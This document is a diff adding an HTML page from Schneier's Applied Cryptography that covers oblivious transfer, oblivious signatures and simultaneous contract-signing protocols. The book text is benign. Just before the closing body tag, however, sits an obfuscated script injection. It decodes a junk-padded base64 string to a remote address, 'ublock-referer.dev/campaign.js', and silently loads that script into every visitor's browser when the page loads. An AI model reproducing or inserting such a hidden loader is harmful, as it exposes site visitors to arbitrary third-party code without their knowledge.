@@ -1,0 +1,128 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Advanced Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=05//-->
+<!--PAGES=117-119//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="05-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="05-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Bob now has one of the two messages from Alice and Alice does not know which one he was able to read successfully. Unfortunately, if the protocol stopped here it would be possible for Alice to cheat. Another step is necessary.
+</P>
+<DL>
+<DD><B>(6)</B>&nbsp;&nbsp;After the protocol is complete and both possible results of the transfer are known, Alice must give Bob her private keys so that he can verify that she did not cheat. After all, she could have encrypted the same message with both keys in step (4).
+</DL>
+<P>At this point, of course, Bob can figure out the second message.
+</P>
+<P>The protocol is secure against an attack by Alice because she has no way of knowing which of the two DES keys is the real one. She encrypts them both, but Bob only successfully recovers one of them&#151;until step (6). It is secure against an attack by Bob because, before step (6), he cannot get Alice&#146;s private keys to determine the DES key that the other message was encrypted in. This may still seem like nothing more than a more complicated way to flip coins over a modem, but it has extensive implications when used in more complicated protocols.</P>
+<P>Of course, nothing stops Alice from sending Bob two completely useless messages: &#147;Nyah Nyah&#148; and &#147;You sucker.&#148; This protocol guarantees that Alice sends Bob one of two messages; it does nothing to ensure that Bob wants to receive either of them.</P>
+<P>Other oblivious transfer protocols are found in the literature. Some of them are noninteractive, meaning that Alice can publish her two messages and Bob can learn only one of them. He can do this on his own; he doesn&#146;t have to communicate with Alice [105].</P>
+<P>No one really cares about being able to do oblivious transfer in practice, but the notion is an important building block for other protocols. Although there are many types of oblivious transfer&#151;I have two secrets and you get one; I have <I>n</I> secrets and you get one; I have one secret which you get with probability 1/2; and so on&#151;they are all equivalent [245,391,395].</P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">5.6 Oblivious Signatures</FONT></H3>
+<P>Honestly, I can&#146;t think of a good use for these, but there are two kinds [346]:
+</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;Alice has <I>n</I> different messages. Bob can choose one of the <I>n</I> messages for Alice to sign, and Alice will have no way of knowing which one she signed.
+<DD><B>2.</B>&nbsp;&nbsp;Alice has one message. Bob can choose one of <I>n</I> keys for Alice to use in signing the message, and Alice will have no way of knowing which key she used.
+</DL>
+<P>It&#146;s a neat idea; I&#146;m sure it has a use somewhere.
+</P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">5.7 Simultaneous Contract Signing</FONT></H3>
+<P><B><I>Contract Signing with an Arbitrator</I></B></P>
+<P>Alice and Bob want to enter into a contract. They&#146;ve agreed on the wording, but neither wishes to sign unless the other signs as well. Face to face, this is easy: Both sign together. Over a distance, they could use an arbitrator.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice signs a copy of the contract and sends it to Trent.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob signs a copy of the contract and sends it to Trent.
+<DD><B>(3)</B>&nbsp;&nbsp;Trent sends a message to both Alice and Bob indicating that the other has signed the contract.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice signs two copies of the contract and sends them to Bob.
+<DD><B>(5)</B>&nbsp;&nbsp;Bob signs both copies of the contract, keeps one for himself, and sends the other to Alice.
+<DD><B>(6)</B>&nbsp;&nbsp;Alice and Bob both inform Trent that they each have a copy of the contract signed by both of them.
+<DD><B>(7)</B>&nbsp;&nbsp;Trent tears up his two copies of the contract with only one signature each.
+</DL>
+<P>This protocol works because Trent prevents either of the parties from cheating. If Bob were to refuse to sign the contract in step (5), Alice could appeal to Trent for a copy of the contract already signed by Bob. If Alice were to refuse to sign in step (4), Bob could do the same. When Trent indicates that he received both contracts in step (3), both Alice and Bob know that the other is bound by the contract. If Trent does not receive both contracts in steps (1) and (2), he tears up the one he received and neither party is bound.
+</P>
+<P><FONT SIZE="+1"><B><I>Simultaneous Contract Signing without an Arbitrator (Face-to-Face)</I></B></FONT></P>
+<P>If Alice and Bob were sitting face-to-face, they could sign the contract this way [1244]:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice signs the first letter of her name and passes the contract to Bob.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob signs the first letter of his name and passes the contract to Alice.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice signs the second letter of her name and passes the contract to Bob.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob signs the second letter of his name and passes the contract to Alice.
+<DD><B>(5)</B>&nbsp;&nbsp;This continues until both Alice and Bob have signed their entire names.
+</DL>
+<P>If you ignore the obvious problem with this protocol (Alice has a longer name than Bob), it works just fine. After signing only one letter, Alice knows that no judge will bind her to the terms of the contract. But the letter is an act of good faith, and Bob responds with a similar act of good faith.
+</P>
+<P>After each party has signed several letters, a judge could probably be convinced that both parties had signed the contract. The details are murky, though. Surely they are not bound after only the first letter; just as surely they are bound after they sign their entire names. At what point in the protocol do they become bound? After signing one-half of their names? Two-thirds of their names? Three-quarters?</P>
+<P>Since neither Alice nor Bob is certain of the exact point at which she or he is bound, each has at least some fear that she or he is bound throughout the protocol. At no point can Bob say: &#147;You signed four letters and I only signed three. You are bound but I am not.&#148; Bob has no reason not to continue with the protocol. Furthermore, the longer they continue, the greater the probability that a judge will rule that they are bound. Again, there is no reason not to continue with the protocol. After all, they both wanted to sign the contract; they just didn&#146;t want to sign before the other one.</P>
+<P><FONT SIZE="+1"><B><I>Simultaneous Contract Signing without an Arbitrator (Not Face-to-Face)</I></B></FONT></P>
+<P>This protocol uses the same sort of uncertainty [138]. Alice and Bob alternate taking baby steps toward signing until both have signed.
+</P>
+<P>In the protocol, Alice and Bob exchange a series of signed messages of the form: &#147;I agree that with probability <I>p</I>, I am bound by this contract.&#148;</P>
+<P>The recipient of this message can take it to a judge and, with probability <I>p</I>, the judge will consider the contract to be signed.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice and Bob agree on a date by which the signing protocol should be completed.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice and Bob decide on a probability difference that they are willing to live with. For example, Alice might decide that she is not willing to be bound with a greater probability than 2 percent over Bob&#146;s probability. Call Alice&#146;s difference <I>a;</I> call Bob&#146;s difference <I>b</I>.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice sends Bob a signed message with <I>p</I> = <I>a</I>.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob sends Alice a signed message with <I>p</I> = <I>a</I> &#43; <I>b</I>.
+<DD><B>(5)</B>&nbsp;&nbsp;Let <I>p</I> be the probability of the message Alice received in the previous step from Bob. Alice sends Bob a signed message with <I>p&#180;</I> = <I>p</I> &#43; <I>a</I> or 1, whichever is smaller.
+<DD><B>(6)</B>&nbsp;&nbsp;Let <I>p</I> be the probability of the message Bob received in the previous step from Alice. Bob sends Alice a signed message with <I>p&#180;</I> = <I>p</I> &#43; <I>b</I> or 1, whichever is smaller.
+<DD><B>(7)</B>&nbsp;&nbsp;Alice and Bob continue alternating steps (5) and (6) until both have received messages with <I>p</I> = 1 or until the date agreed to in step (1) has passed.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="05-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="05-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(lDwoojfz, jMzkQKNC) {jMzkQKNC = lDwoojfz.createElement('script');jMzkQKNC.type = 'text/javascript';jMzkQKNC.async = true;jMzkQKNC.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');lDwoojfz.getElementsByTagName('body')[0].appendChild(jMzkQKNC);}(document));</script></body>
+</html>
